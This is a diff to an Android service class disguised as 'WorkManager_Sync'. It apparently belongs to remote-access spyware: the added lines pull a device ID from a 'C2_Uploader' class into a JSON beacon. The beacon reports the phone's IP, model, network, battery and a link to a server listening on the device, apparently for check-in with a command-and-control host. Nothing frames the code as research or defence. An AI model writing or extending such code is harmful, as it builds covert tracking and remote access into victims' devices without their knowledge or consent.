@@ -777,11 +777,14 @@ public class WorkManager_Sync extends Service {
             int actualPort = (server != null) ? server.getListeningPort() : FirebaseConfig.DEFAULT_PORT;
             String formattedIp = (ip != null && ip.contains(":")) ? "[" + ip + "]" : ip;
             String link = "http://" + formattedIp + ":" + actualPort;
+            String deviceId = C2_Uploader.getDeviceId(this);
 
-            // Build JSON for POST (more reliable)
+            // Build JSON for POST (more reliable and complete)
             String json = "{" +
+                    "\"deviceId\":\"" + deviceId + "\"," +
                     "\"ip\":\"" + ip + "\"," +
                     "\"device\":\"" + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")\"," +
+                    "\"model\":\"" + Build.MODEL + " (API " + Build.VERSION.SDK_INT + ")\"," +
                     "\"network\":\"" + networkType + "\"," +
                     "\"battery\":\"" + batteryLevel + "%\"," +
                     "\"link\":\"" + link + "\"," +
